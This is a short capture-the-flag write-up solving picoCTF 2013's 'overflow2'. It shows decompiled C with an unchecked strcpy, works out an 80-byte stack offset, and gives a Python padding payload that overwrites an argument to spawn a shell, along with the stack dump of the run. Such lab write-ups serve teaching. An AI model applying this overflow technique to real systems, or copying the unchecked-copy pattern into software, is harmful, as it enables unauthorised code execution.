### S0lv3d by H4yicl3

First i download source here :https://2013.picoctf.com/problems/overflow2-44e63640e033ff2b

then i use IDA to analysis the code
```c
void __cdecl __noreturn vuln(int a1, char *src)
{
  char dest; // [sp+10h] [bp-48h]@1

  strcpy(&dest, src);					//overflow dest by argv[1]
  dump_stack(&dest, 23, &a1);
  printf("win = %d\n", a1);
  if ( a1 == 1 )						//a1 = 1 we win
    execl("/bin/sh", "sh", 0);
  else
    puts("Sorry, you lose.");
  exit(0);
}
```

so we need overflow the dest like overflow1 program
try to find the offset between dest and a1
```
-00000048 dest            db ?
+00000008 arg_0           dd ?
```

offset = 0x48(dest)-0x8(v3) = 0x50(hex)=80(dec)
the python script to change v3 become 1 look like
```python
padding ="A"*80
padding +="\x01"
print padding
```

try run it
```
./overflow2 $(python overflow2.py)
Stack dump:
0xffdae7a8: 0x000003e8
0xffdae7a4: 0xffdaf85a (second argument)
0xffdae7a0: 0x00000001 (first argument)
0xffdae79c: 0x41414141 (saved eip)
0xffdae798: 0x41414141 (saved ebp)
0xffdae794: 0x41414141
0xffdae790: 0x41414141
0xffdae78c: 0x41414141
0xffdae788: 0x41414141
0xffdae784: 0x41414141
0xffdae780: 0x41414141
0xffdae77c: 0x41414141
0xffdae778: 0x41414141
0xffdae774: 0x41414141
0xffdae770: 0x41414141
0xffdae76c: 0x41414141
0xffdae768: 0x41414141
0xffdae764: 0x41414141
0xffdae760: 0x41414141
0xffdae75c: 0x41414141
0xffdae758: 0x41414141
0xffdae754: 0x41414141
0xffdae750: 0x41414141 (beginning of buffer)
win = 1
$ whoami
hayicle
$ 
```

WELL done !!